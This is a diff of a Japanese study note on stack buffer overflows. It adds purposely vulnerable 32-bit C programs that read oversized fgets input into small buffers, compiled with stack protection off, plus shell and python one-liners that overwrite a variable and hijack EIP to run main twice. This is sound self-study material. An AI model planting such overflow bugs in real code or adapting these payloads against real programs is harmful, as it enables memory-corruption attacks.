@@ -203,7 +203,7 @@ Disable ASLR before doing the following.
 int main(int argc, char *argv[]) {
 	int zero = 0;
 	char buffer[10];
-	
+
 	printf("buffer address\t= %x\n", (int)buffer);
 	printf("zero address\t= %x\n", (int)&zero);
 
@@ -228,7 +228,7 @@ $ gcc -m32 -fno-stack-protector -o bof1 bof1.c
 int main(int argc, char *argv[]) {
 	char buffer[10];
 	int zero = 0;
-	
+
 	fgets(buffer, 64, stdin);
 	printf("zero = %x\n", zero);
 	if (zero == 0x12345678) {
@@ -237,19 +237,47 @@ int main(int argc, char *argv[]) {
 	return 0;
 }
 ```
-コンパイル、実効
+コンパイル、実行
 ```
 $ gcc -m32 -fno-stack-protector -o bof2 bof2.c
 $ echo -e 'AAAAAAAAAA\x12\x34\x56\x78' | ./bof2
 $ echo -e 'AAAAAAAAAA\x78\x56\x34\x12' | ./bof2
 ```
 little endianであることに注意
+追記）後日これで試してみたらsegfaultは起こせても、変数の任意の書き換えは行えなかった。標準入力からfgetsしたときには、終端文字として0x0aが追加され、int zeroの4バイト分を全て上書きしようとすると、そのすぐ次の1バイトが0x0aで書き換わってしまう。以下のようにmain関数以外の関数で書くと正常の動く... なぜなんだ...
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+void foo() {
+	int zero = 0;
+	char buffer[10];
+
+	printf("buffer address = %x\n",(int)buffer);
+	printf("zero address = %x\n", (int)&zero);
+
+	fgets(buffer, 64, stdin);
+	printf("zero = %x\n", zero);
+	if (zero == 0x12345678) {
+	printf("congrats!!");
+	}
+}
+int main() {
+	foo();
+	return 0;
+}
+
+```
+g optionをつけると、gdbでシンボルつきになる。
+```
+$ gcc -m32 -fno-stack-protector -g -o bof2 bof2.c
+```
 
 ### リターンアドレスの書き換え
 
 リターンアドレスを書き換えることでプログラムの実効一を変更することができる。
 
-```
+```c
 #include <stdio.h>
 #include <string.h>
 
@@ -263,15 +291,30 @@ int main(int argc, char *argv[]) {
 	return 0;
 }
 ```
+これではEIPをうまく奪取できなかった。
+関数を分けて、実行するとうまくいく。
 
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x1a\x05\x00\x00
+```c
+#include <stdio.h>
+#include <string.h>
 
+char buffer[32];
 
+void foo() {
+	char local[32];
+	printf("buffer: 0x%x\n", &buffer);
+	fgets(local, 128, stdin);
+	strcpy(buffer, local);
+}
 
+int main(int argc, char *argv[]) {
+	foo();
+	return 0;
+}
 
-
-
-
-
-
-    
+```
+main関数の先頭アドレスを取得できれば、
+```
+$ python -c "print 'A'*44 + '\x9e\x55\x55\x56'" | ./bof2
+```
+などでEIPを奪取し、main関数を2回実行できる。
